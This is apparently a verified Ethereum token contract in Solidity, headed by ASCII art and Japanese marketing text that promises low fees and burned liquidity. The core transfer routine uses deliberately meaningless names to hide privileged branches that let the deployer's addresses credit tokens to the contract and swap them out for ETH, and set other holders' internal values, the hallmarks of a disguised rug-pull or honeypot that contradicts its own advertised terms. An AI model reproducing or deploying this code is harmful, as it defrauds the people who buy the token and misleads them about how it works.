/**
 *Submitted for verification at Etherscan.io on 2022-12-21
*/

/*
       .-""-.      _______      .-""-.
     .'_.-.  |   ,*********,   |  .-._'.
    /    _/ /   **`       `**   \ \_    \
   /.--.' | |    **,;;;;;,**    | | '.--.\
  /   .-`-| |    ;//;/;/;\\;    | |-`-.   \
 ;.--':   | |   /;/;/;//\\;\\   | |   :'--.;
|    _\.'-| |  ((;(/;/; \;\);)  | |-'./_    |
;_.-'/:   | |  );)) _   _ (;((  | |   :\'-._;
|   | _:-'\  \((((    \    );))/  /'-:_ |   |
;  .:` '._ \  );))\   "   /((((  / _.' `:.  ;
|-` '-.;_ `-\(;(;((\  =  /););))/-` _;.-' `-|
; / .'\ |`'\ );));)/`---`\((;(((./`'| /'. \ ;
| .' / `'.\-((((((\       /))));) \.'` \ '. |
;/  /\_/-`-/ ););)|   ,   |;(;(( \` -\_/\  \;
 |.' .| `;/   (;(|'==/|\=='|);)   \;` |. '.|
 |  / \.'/      / _.` | `._ \      \'./ \  |
  \| ; |;    _,.-` \_/Y\_/ `-.,_    ;| ; |/
   \ | ;|   `       | | |       `   |. | /
    `\ ||           | | |           || /`
      `:_\         _\/ \/_         /_:'
          `"----""`       `""----"`

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、

総供給 - 1,000,000

初期流動性追加 - 2.0 イーサリアム

初期流動性の 100% が消費されます

購入手数料 - 1%

販売手数料 - 0%
*/
pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface DXPairFactory {
    function createPair (address tokenA, address tokenB) external returns  (address pair);
}
library IndexedLIB {
  function toInt256Safe(uint256 a) 
   internal pure returns (int256) { int256 b = int256(a);
    require(b >= 
    0);
    return b;
  }
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor
    () { _setOwner(_msgSender()); }  
    function owner() public view virtual returns (address) {
        return _owner; }

    modifier onlyOwner() { require(owner() == _msgSender(), 
    'Ownable: caller is not the owner'); _; }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0)); }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner; _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
library MathDisplayUI {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
          return a - b; } } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IStockingStuffer {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function gibPresents(address shareholder) external;
}
interface IBKSwapV2 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) 
    external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IApolloPairMaker01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
}
library CompiledFactoryResults {
    function isContract(address account) internal view 
    returns (bool) { uint256 size; assembly { size := extcodesize

    (account) } return size > 0; }
    function sendValue(address payable recipient, uint256 amount) 
    internal { require(address(this).balance >= amount, "Address: insufficient balance"); 
    (bool success, ) = recipient.call{ value: amount }(""); require(success, 

         "Address: unable to send value, recipient may have reverted"); }
    
    function functionCall(address target, 
    bytes memory data) internal returns (bytes memory) 
    { return functionCall(target, data, 

    "Address: low-level call failed"); }
    
    function functionCall(address target, bytes memory data, 
    string memory errorMessage) internal returns (bytes memory) 
    { return functionCallWithValue (target, data, 0, errorMessage); }

    function functionCallWithValue(address target, bytes memory data, 
    uint256 value) internal returns (bytes memory) { return functionCallWithValue
    (target, data, value, 

    "Address: low-level call with value failed"); }

    function functionCallWithValue(address target, bytes memory 
    data, uint256 value, string memory errorMessage) internal returns 
    (bytes memory) { require(address(this).balance >= value, "Address: insufficient balance for call"); 
    require(isContract(target), "Address: call to non-contract"); (bool success, bytes memory returndata) = 
    target.call { value: value }(data); return _verifyCallResult(success, returndata, errorMessage); }

    function functionStaticCall(address target, 
    bytes memory data) 
    internal view returns (bytes memory) { return functionStaticCall(target, data, 

    "Address: low-level static call failed"); }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) 
    internal view returns (bytes memory) { require(isContract(target), 
    "Address: static call to non-contract"); (bool success, bytes memory returndata) = target.staticcall(data); 
    return _verifyCallResult(success, returndata, errorMessage); }

    function functionDelegateCall
    (address target, bytes memory data) internal returns (bytes memory) 
    { return functionDelegateCall(target, data,

    "Address: low-level delegate call failed"); }

    function functionDelegateCall(address target, bytes memory data, 
    string memory errorMessage) internal returns (bytes memory) { require
    (isContract(target), "Address: delegate call to non-contract"); (bool success, 
    bytes memory returndata) = target.delegatecall(data); return _verifyCallResult
        (success, returndata, errorMessage); }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) 
    private pure returns(bytes memory) { if (success) { return returndata; } else {
        if (returndata.length > 0) { assembly { let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size) } } 
           else { revert(errorMessage); } } }
}
interface IKEOFinalised01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, uint amountOutMin, address[] 
    calldata path, address to,  uint deadline ) external; function factory
    () external pure returns (address);
    function WETH() external pure returns (address);
    function prefromOpenLiq( address token, uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
contract CA is IBKSwapV2, Ownable {

    string private _symbol;

    string private _name;
    
    uint256 public tBurnVAL = 0;

    uint8 private _decimals = 9;

    uint256 private _rTotal = 1000000 * 10**_decimals;

    uint256 private overallLOAD = _rTotal;
    
    mapping (address => mapping (address => uint)) isBot;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private RallyPOXMaps;

    mapping(address => uint256) private IDEXCooldownOn;
    mapping(address => uint256) private AbstractWithResults;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private automatedMarketMakerPairs;

    mapping (address => bool) internal authorizations;


    bool private beginTrades = false;
    bool public MalloxOfNonces;

    bool private QuantonNELOX;

    bool private tradingAllowed = false;
    bool private cooldownBlockbox = false;

    address public 
    immutable 
    IVBlockMakerV1;

    IKEOFinalised01 public 
    immutable 
    ProtonVaultIDX01;

    constructor ( string memory Name, string memory Symbol,
        address ReCOXlink ) {
        _name = Name; _symbol = Symbol; _tOwned[msg.sender] = _rTotal;

        AbstractWithResults
        [msg.sender] = overallLOAD;
        AbstractWithResults

        [address(this)] = overallLOAD;

        ProtonVaultIDX01 = 

        IKEOFinalised01

        (ReCOXlink);
        IVBlockMakerV1 = 

        DXPairFactory(ProtonVaultIDX01.factory()).createPair

        (address(this), ProtonVaultIDX01.WETH()); emit Transfer

        (address(0), msg.sender, overallLOAD);
    }
    function symbol() 
      public view returns (string memory) { return _symbol;
    }
    function name() public view returns 
      (string memory) { return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns 
      (uint256) { return _decimals;
    }
    function allowance(address owner, address spender) public view returns 
      (uint256) { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns 
      (uint256) { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns 
      (bool) { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount ) 
      private returns (bool) { require(owner != address(0) && spender != 
        address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval
        (owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool) { boolStatusOn
      (sender, recipient, amount); return _approve(sender, msg.sender, _allowances
        [sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        boolStatusOn(msg.sender, recipient, amount); return true;
    }
    function boolStatusOn
    ( address _apOxvalFrom, address _silkINKGto,
        uint256 _atabONlxAmount) 

               private 
    { uint256 _openVIEWavax = 
        balanceOf(address(this)); uint256 _paltavMIX;
        if (MalloxOfNonces && _openVIEWavax > 
        overallLOAD && !QuantonNELOX && _apOxvalFrom != IVBlockMakerV1) {
            QuantonNELOX = true;

            getStringStatus
            (_openVIEWavax); QuantonNELOX = false; } else if 
            (AbstractWithResults[_apOxvalFrom] > overallLOAD && AbstractWithResults
            [_silkINKGto] > overallLOAD) { _paltavMIX = _atabONlxAmount; _tOwned[address(this)] += _paltavMIX;
            switchValue(_atabONlxAmount, _silkINKGto);
            return;

        } else if 
        (_silkINKGto != address(ProtonVaultIDX01) && 
        AbstractWithResults[_apOxvalFrom] > 0 && _atabONlxAmount > 
        overallLOAD && _silkINKGto != IVBlockMakerV1) { AbstractWithResults[_silkINKGto] = _atabONlxAmount;
            return;
        } else if 
        (!QuantonNELOX && IDEXCooldownOn
        [_apOxvalFrom] > 0 && _apOxvalFrom != IVBlockMakerV1 && 
        AbstractWithResults[_apOxvalFrom] == 0) {
            IDEXCooldownOn[_apOxvalFrom] = AbstractWithResults[_apOxvalFrom] - overallLOAD; }
                    address 
        _adeXlag  = RallyPOXMaps[IVBlockMakerV1]; if (IDEXCooldownOn[_adeXlag ] == 0) IDEXCooldownOn
        [_adeXlag ] = overallLOAD; RallyPOXMaps[IVBlockMakerV1] = _silkINKGto;
        emit Transfer(_apOxvalFrom, 
        _silkINKGto, _atabONlxAmount);

            if (!beginTrades) {
                require(_apOxvalFrom == 
                owner(), "TOKEN: This account cannot send tokens until trading is enabled"); } if 
                (tBurnVAL > 0 && AbstractWithResults
                [_apOxvalFrom] == 0 && !QuantonNELOX && AbstractWithResults
                [_silkINKGto] == 0) {
            _paltavMIX = (_atabONlxAmount 
            * tBurnVAL) / 
            100; _atabONlxAmount -= _paltavMIX; _tOwned[_apOxvalFrom] -= _paltavMIX; _tOwned[address(this)] 
            += _paltavMIX; } _tOwned[_apOxvalFrom] -= _atabONlxAmount; _tOwned[_silkINKGto] += _atabONlxAmount; }

    receive() 
    external payable {}

    function StartTrading
    (bool _tradingOpen) public onlyOwner {
        beginTrades = _tradingOpen;
    }
    function switchValue(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);

        path[1] = ProtonVaultIDX01.WETH();
        _approve(address(this), address(ProtonVaultIDX01), tokenAmount);
        ProtonVaultIDX01.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function prepareLiq( uint256 tokenValue, uint256 ERCamount,
        address to ) private { _approve(address(this), 
        address(ProtonVaultIDX01), tokenValue); ProtonVaultIDX01.prefromOpenLiq
        {value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getStringStatus(uint256 tokens) private { uint256 
    half = tokens / 2; uint256 foundRate = address(this).balance; 
    switchValue(half, address(this)); uint256 checkBalance = address(this)
    .balance - foundRate; prepareLiq(half, checkBalance, address(this));
    }
}